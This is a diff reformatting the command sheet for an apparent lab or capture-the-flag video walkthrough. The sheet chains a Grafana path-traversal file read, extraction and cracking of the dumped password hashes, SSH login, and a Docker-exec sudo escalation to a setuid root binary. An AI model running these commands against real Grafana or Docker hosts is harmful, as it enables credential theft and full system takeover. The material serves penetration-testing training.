@@ -1,5 +1,9 @@
-# These commands were used in this walkthrough: https://youtu.be/nwoxia9Gcuk
-# ─── Initial Exploitation: Grafana LFI ─────────────────────────────────────
+# These commands were used in this walkthrough: https://youtu.be/nwoxia9Gcuk (Grafana → Docker → Root)
+
+```bash
+#############################################
+# 1️⃣ Initial Exploitation: Grafana LFI
+#############################################
 
 # Read /etc/passwd via path traversal in Grafana
 curl --path-as-is 'http://IP:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
@@ -7,8 +11,9 @@ curl --path-as-is 'http://IP:3000/public/plugins/alertlist/../../../../../../../
 # Dump the Grafana database (contains user hashes)
 curl --path-as-is 'http://IP:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o ./grafana.db
 
-
-# ─── Hash Extraction & Cracking ────────────────────────────────────────────
+#############################################
+# 2️⃣ Extract & Crack Grafana Hashes
+#############################################
 
 # Use this tool to extract and convert Grafana hashes:
 # https://github.com/iamaldi/grafana2hashcat
@@ -19,17 +24,19 @@ python3 grafana2hashcat.py ./grafana.db -o ./hashcat_hashes.txt
 hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
 
 
-# ─── Gained Access ─────────────────────────────────────────────────────────
+#############################################
+# 3️⃣ Access the Host via SSH
+#############################################
 
 ssh boris@<ip>
 # Password: <from cracked hash>
 
-
-# ─── Privilege Escalation ──────────────────────────────────────────────────
+#############################################
+# 4️⃣ Privilege Escalation via Docker
+#############################################
 
 sudo -l
 # => You can run: (root) NOPASSWD: /snap/bin/docker exec *
-
 
 # ─── Find Container ID ─────────────────────────────────────────────────────
 
@@ -77,3 +84,4 @@ chmod 4755 /etc/hostname  # make it setuid root
 # Step 5 (host - unprivileged user):
 /var/snap/docker/common/var-lib-docker/containers/<container_id>/hostname -p
 # → You now can read root dir or add your pub ssh_key.
+```
